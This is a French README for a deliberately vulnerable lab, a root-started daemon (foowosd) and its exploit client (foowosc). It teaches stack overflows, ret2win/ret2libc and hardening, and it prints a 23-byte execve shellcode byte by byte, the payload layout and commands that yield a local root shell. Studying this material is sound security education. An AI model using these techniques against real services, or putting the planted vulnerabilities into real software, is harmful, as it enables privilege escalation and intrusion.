# Le lab `wosuid` — RCE root **sans** bit setuid

```
  foowosd   un démon volontairement vulnérable qui est root parce qu'il a été
            *DÉMARRÉ* en tant que root  (port 2344, loopback seulement par défaut)
  foowosc   l'exploit : transforme un débordement de pile en un **shell** root
            en exécutant de la shellcode — les mêmes 23 octets qui ont cassé le
            démon user-level `food` du lab principal
```

C'est le troisième lab de la série. Même chaîne d'outils d'exploit, même style,
une différence fondamentale :

| Lab | comment le processus cible devient root              | shell `uid=0(root)` ? |
|----------|------------------------------------------------|----------------------|
| food/fooc | jamais — c'est un démon utilisateur ordinaire | non |
| foosd/foosc | le bit SUID (`chmod u+s`) — euid 0, ruid 1000 | oui (exige `setreuid` dans la shellcode, car bash réinitialise euid→ruid) |
| **foowosd/foowosc** | **aucun — root *démarre* le démon** (sudo / systemd `User=root`) | **oui (shellcode `execve` ordinaire)** |

Le bit setuid est un *moyen de transport* des privilèges — pas les privilèges
eux-mêmes. Un démon démarré par root a des uids réel, effectif et sauvegardé
tous égaux à 0. Pour le noyau, c'est root, point final ; il ne peut pas et ne
veut pas savoir si le processus y est arrivé via `+s` sur un fichier ou via
`sudo ./foowosd`. Le débordement d'un démon démarré par root est donc un exploit
root — *« je n'ai pas de binaires SUID » n'est pas la même chose que « je ne
suis pas exploitable ».*

C'est toute la leçon de ce lab. Tout ce qui suit, c'est le mécanisme.

---

## Démarrage rapide (ce que l'utilisateur a demandé)

```
cd wosuid
make                 # compile le démon, l'exploit et la harnesse de test
```

### Le vrai truc — exécutez le démon en tant que **root**

```
sudo make run-root      # démarre foowosd en uid 0 (processus, pas état de fichier)
make test-root          # chaque technique doit maintenant donner uid=0(root)
```

### Pas de sudo ? Le chemin noyau identique via un user namespace

```
make run-root-ns        # uid 0 dans un user namespace — aucun mot de passe requis
make test-root          # mêmes verdicts ; utilisé par la CI et tous ceux sans sudo
```

### Référence — démon comme votre utilisateur normal (root nulle part)

```
make run                # foowosd tourne avec vos uids
make test               # les exploits atterrissent des shells, mais `root` est attendu MISSING
```

### Rituel de nettoyage (toujours : c'est un lab de shell root)

```
make stop
```

`foowosd` n'est *pas* setuid, et rien dans ce répertoire ne fait jamais
`chmod +s` — c'est le but. L'état dangereux est **le processus**, pas le
fichier.

---

## Quand on vous dit de poser le bit SUID

Ça ne vous sera **pas** demandé. Ce lab n'a délibérément pas de bit SUID :

- `foowosd` est compilé, vous appartient et a des permissions ordinaires comme
  n'importe quel programme.
- Il devient root comme les vrais démons — en étant *démarré* par root.
- `make run-root` utilise `sudo` pour exactement ça, et `make run-root-ns`
  obtient un vrai processus uid 0 sans rien de tout cela.

Le bit Suid appartient au lab *frère* (`foosd`). Le contraste entre les deux
est le programme :

1. Lab SUID : le bit donne **euid 0, mais ruid 1000** → `execve("/bin/sh")`
   est dégradé par le gardien de bash (`euid != ruid` → reset) → la shellcode
   doit d'abord appeler `setreuid(0,0)` (payload de 32 octets).
2. Ce lab : root **démarre** le processus → **ruid == euid == 0** → le
   gardien n'a rien à réinitialiser → la shellcode `execve` ordinaire de 23
   octets garde root.

Même débordement. Même technique. *Origine* des privilèges différente, forme de
payload différente. C'est la leçon en miniature.

---

## Le protocole

Quel que soit le type de client qui se connecte, foowosd le salue avec :

```
FOOWOSD 1.0 ids=0/0 leak stack=0x7ffd… libc=0x7f…      (le banner + les fuites)
BUF=0x7ffd…                                             (l'adresse du tampon)
```

`ids=euid/ruid` est le canal *« suis-je root ? »*. foowosc affiche un
avertissement sonore quand euid n'est pas 0 (c'est-à-dire que vous avez démarré
le démon en utilisateur ordinaire) : la payload atterrit quand même, mais le
shell devient un shell utilisateur, et appeler l'exploit « cassé » serait faux —
il n'escalade juste pas.

> Note d'orthographe : `ids=`, pas `euid=`/`ruid=`. La harnesse de test prouve
> un `id` vivant en matchant la forme littérale `uid=NNN(`, donc le banner ne
> doit jamais contenir une sous-chaîne qui satisfait elle-même le contrôle.
> (Dans le lab SUID, exactement ce piège a produit un spectaculaire faux
> positif.)

---

## Les techniques d'exploit (`foowosc -t …`)

Les quatre chemins d'exploit ci-dessous fonctionnent contre foowosd. Quand le
démon est root, **tout ce qui spawn quelque chose donne root** — contrairement
au lab SUID où ret2win/ret2libc étaient silencieusement dégradés en uid 1000
par le gardien de bash. Ici, il n'y a pas de mismatch à surveiller.

| `-t`          | ce qui se passe                                                       | quand le démon est root |
|---------------|---------------------------------------------------------------------|---------------------|
| `shellcode`   | `execve("/bin/sh", NULL, NULL)` de 23 octets s'exécute sur la pile.   | **shell root** (par défaut) |
| `ret2win`     | saut vers `win()` → `execl("/bin/sh")`                                | **shell root** |
| `ret2libc`    | ROP : `pop rdi; ret` → `"/bin/sh"` → `system()`                      | **shell root** |
| `demo`        | débordement de bourrage uniquement — attendez un SIGSEGV dans le log | crash, par conception |
| `leak`        | affiche juste les fuites, n'envoie pas de payload                     | n/a |

```
./foowosc -t shellcode       # interactif ; cible par défaut 127.0.0.1:2344
./foowosc -t shellcode -n    # envoyer et rapporter, pas de session interactive
```

Une session interactive réussie relaie votre terminal vers le shell *sur la
victime* — il y a exactement un shell dans le tableau, et c'est `/bin/sh` qui
tourne en root à l'intérieur de foowosd. Tapez `id` pour voir `uid=0(root)`.

### Pourquoi il n'y a pas de technique `ret2win-root` ici

foosc en avait une — elle sautait vers un `win_root()` qui appelait
`setreuid(0,0)` avant l'exec, parce qu'un processus setuid tournait avec un uid
réel qui disait encore 1000. Un processus *démarré* par root a déjà l'uid réel
à 0 ; il n'y a rien à nettoyer, donc la fonction et la technique supplémentaires
n'auraient rien appris. Supprimé.

---

## Ce que fait foowosc, étape par étape

1. **Analyse statique** — `objdump -d` de `./foowosd`. Trouve
   `vulnerable_handler`, `win()`, le `lea -0x50(%rbp)` qui adresse `buf`, et le
   premier `ret` nu. À partir du décalage, il calcule `rip_off = 80 + 8 = 88`.
   Rien n'est hardcodé ; ça survit à une recompilation.
2. **Auto-introspection** — lit son propre `/proc/self/maps` et `dlsym()`e
   `system`/`read` pour apprendre les *offsets* de la libc. La base libc de la
   cible est `leaked_read − off_read`, puis `system = base + off_system`, etc.
   Cette arithmétique de delta est la raison pour laquelle les exploits
   survivent aux versions de libc.
3. **Connecte** — lit le banner/les fuites (`ids=`, `stack=`, `libc=`, `BUF=`).
4. **Construit la payload** — pour `shellcode` : 23 octets de code machine, du
   bourrage jusqu'à `rip_off`, puis la RIP sauvegardée = `buf` (pour que le
   `ret` saute dans le code). Pour `ret2win`/`ret2libc` : des adresses
   calculées depuis l'analyse — aucune exécution de pile nécessaire.
5. **Le correctif d'alignement** — un `ret` nu détourné donne au callee
   `rsp ≡ 8 (mod 16)`, et le code SSE2 de glibc fault en `movaps` sur une pile
   mal alignée (le crash-reporter journalise `si_addr=(nil)` — l'indice).
   foowosc insère un gadget `ret` supplémentaire avant la vraie cible et
   rétablit l'invariant. Une technique de gants de soie dans un lab de
   shellcode, mais c'est la différence entre une payload qui « marche parfois »
   et une qui marche toujours.
6. **Envoie, puis relaie** — le processus victime *est* le shell ; ce processus
   ne fait que splisser des octets. Pas de shell local, pas d'autre lecteur —
   le bug à curseur de lecture unique (un octet mangé par morceau) est
   documenté dans `become_shell()`.

---

## Les bugs délibérés du démon (tous dans `foowosd.c`, toutes de vraies classes CWE)

| # | bug | CWE | note |
|---|-----|-----|------|
| 1 | `read(fd, buf, 512)` dans un tampon de pile de 64 octets | CWE-120 | le débordement : 448 octets au-delà de `buf`, RIP sauvegardée à +88 |
| 2 | seulement `snprintf(line, …, "%.*s", …)` ; mais `%` de l'attaquant dans le chemin d'echo | CWE-134 | la fuite est ici la vraie payload ; un `%n` dans un processus *root* serait un write-what-where en root |
| 3 | les enfants gardent root en traitant des entrées non fiables | CWE-271 | le `drop_privs()` correct (setgroups→setgid→setuid, dans cet ordre, avec vérification) est dans le fichier, commenté, *délibérément jamais appelé* |
| 4 | `ids=`, `stack=`, `libc=`, `BUF=` révélés à n'importe quel client | CWE-200 | sans ces fuites, les techniques shellcode et ret2libc ne pourraient pas calculer d'adresses (ASLR les vaincrait) |

Le handler a exactement la même forme `buf[64]`/`read(512)` que les deux autres
labs, donc le pipeline commun de reconnaissance par objdump fonctionne sans
changement.

---

## Comment inspecter le démon (parcours d'apprentissage)

```
make status            # tourne-t-il ? en quel uid ? l'état du fichier est montré
make run-root          # ou run / run-root-ns
./foowosc -t leak      # voyez le banner et les fuites, n'envoyez rien
./foowosc -t demo      # débordement de bourrage -> SIGSEGV, journalisé avec RIP/rsp
./foowosc -t shellcode # le shell root interactif
make test-root         # matrice complète, toutes les techniques, --must-root
```

Crash-reporter : Au SIGSEGV, le démon journalise l'adresse d'erreur, RIP et
RSP. Un `ret` dans un `0x4141…` non canonique fault sur le `ret` lui-même (RIP
comme `0x4028xx`, `si_addr=(nil)`) — bon à savoir avant de lire une ligne de log
comme une déréférence NULL.

---

## Pourquoi la shellcode fait 23 octets, pas 32

```
31 f6        xor esi, esi            ; argv = NULL
31 d2        xor edx, edx            ; envp = NULL
48 bf 2f62696e2f736800 movabs rdi, "/bin/sh\0"
57           push rdi
48 89 e7     mov rdi, rsp
6a 3b        push 0x3b               ; 59 = execve
58           pop rax
0f 05        syscall
```

Le lab SUID a besoin de `setreuid(0,0)` devant ça. Pas ce lab, pour la raison
répétée partout : **ruid est déjà 0**, parce que root a démarré le processus.
`make verify` prouve que les octets dans `foowosc.c` sont, octet pour octet, ce
que `shellcode.S` assemble.

---

## Contre-mesures — ce que `make hardened` change

Build durcie (`-fstack-protector-strong -fPIE -pie -z noexecstack`) :

| technique | `foowosd` vulnérable | `foowosd_hardened` durci |
|-----------|----------------------|------------------------------|
| `shellcode` | shell root (pile exécutable) | SIGSEGV au contrôle de canary / NX |
| `ret2win` / `ret2libc` | shell root | la canary abort le `ret` — mais notez : une build *PIE* rend aussi ces adresses aléatoires |
| `demo` | SIGSEGV, journalisé | SIGSEGV, journalisé |

`make test-hardened` le démontre en direct. L'observation importante n'est pas
seulement que les contre-mesures ont tué les techniques — c'est qu'elles n'ont
**pas** rendu le démon « non-root ». Une build durcie qui est toujours
*démarrée* en root reste un démon root ; la contre-mesure ne fait que relever la
barre pour l'attaquant. Moindre privilège (`drop_privs()`) et sécurité mémoire
sont deux bugs différents, et un démon qui n'a pas besoin de root ne devrait pas
en avoir.

---

## Garde-fous (même politique que le lab SUID)

- **Loopback seulement.** foowosd refuse de se lier ailleurs qu'à `127.0.0.1` /
  `localhost` / `::1`, sauf si vous donnez `-L`. Un démon root sur une vraie
  interface est un *service root distant*. `-L` existe seulement pour montrer
  le garde-fou ; ne l'utilisez pas sur quelque chose qui compte.
- **L'état est journalisé à voix haute.** Au démarrage, il affiche `ruid/euid`
  et si c'est un processus root, pour que vous sachiez toujours quel résultat
  d'exploit attendre.
- **Les verdicts viennent du code de sortie** dans `make test*` (code retour
  de la harnesse pty), jamais d'un grep sur sa sortie — la sortie grepable
  ment.
- **Le pty doit tourner en cooked + ECHO off**, sinon la harnesse s'échoit sa
  propre ligne de commande et falsifie le marqueur. La harnesse désactive ECHO
  et garde ECHONL actif.
- **Rituel de nettoyage :** `make stop` après chaque session. Si le démon
  appartient à root, `stop` vous dit de lancer `sudo pkill -x foowosd`.
- Ne faites jamais tourner ça sur une machine à laquelle vous tenez. Ça existe
  pour distribuer des shells `uid=0` sur l'interface loopback.

---

## Exercices

1. Lancez `make run` (démon utilisateur), puis `./foowosc -t shellcode`.
   Pourquoi le shell n'est-il pas root ? (Vérifiez `ids=` dans le banner —
   foowosc vous le dit avant même que vous vous connectiez.)
2. `make stop && sudo make run-root && make test-root`. Expliquez à partir de
   la ligne du banner pourquoi les quatre techniques donnent maintenant
   `uid=0(root)`.
3. Trouvez `drop_privs()` dans `foowosd.c` et lisez *pourquoi l'ordre* de
   `setgroups → setgid → setuid` compte. Décidez où dans `main()` il aurait sa
   place, et ce que devient la surface d'attaque du lab quand il est
   réellement appelé.
4. Calculez `rip_off` à la main depuis `objdump -d foowosd` : trouvez le
   `lea -0xNN(%rbp)` de `buf` dans `vulnerable_handler`, puis `NN + 8`. foowosc
   fait exactement ça ; vérifiez son calcul contre le vôtre.
5. `make hardened && make test-hardened`. Quelle technique tombe sur la canary,
   et laquelle sur NX ? Pourquoi le durcissement ne change-t-il pas ce que
   `make status` rapporte sur *le processus* ?
6. Comparez les shellcodes des deux labs : 23 octets ici, 32 pour foosd. Que
   font les 9 octets supplémentaires, et pourquoi ne sont-ils nécessaires que
   dans le cas SUID ?
7. Lisez le commentaire de `become_shell()` sur la curseur de lecture unique.
   Reconstruisez mentalement l'état d'échec : deux lecteurs sur une socket,
   c'est le shell de connexion qui mange un octet par morceau — « uid=1000… »
   arrive comme « id=1000… ». Pourquoi un processus relay ne peut-il jamais
   avoir ce bug ?

---

## Fichiers

```
foowosd.c                 le démon root vulnérable (chaque ligne commentée)
foowosc.c                 l'exploit (chaque ligne commentée)
shellcode.S               l'assembleur de référence pour la payload de 23 octets
tests/pty_wosuid_test.c   la harnesse pty (marqueur + contrôle strict de forme id)
Makefile                  build / run / run-root / run-root-ns / test /
                          test-root / verify / hardened / clean …
```

Labs frères : `../food.c`/`../fooc.c` (baseline user-level, port 2342) et
`../suid/` (démon root SUID `foosd`/`foosc`, port 2343). Les ports sont
délibérément différents — vous pouvez faire tourner les trois en même temps et
croiser leurs lignes `ids=` dans le banner.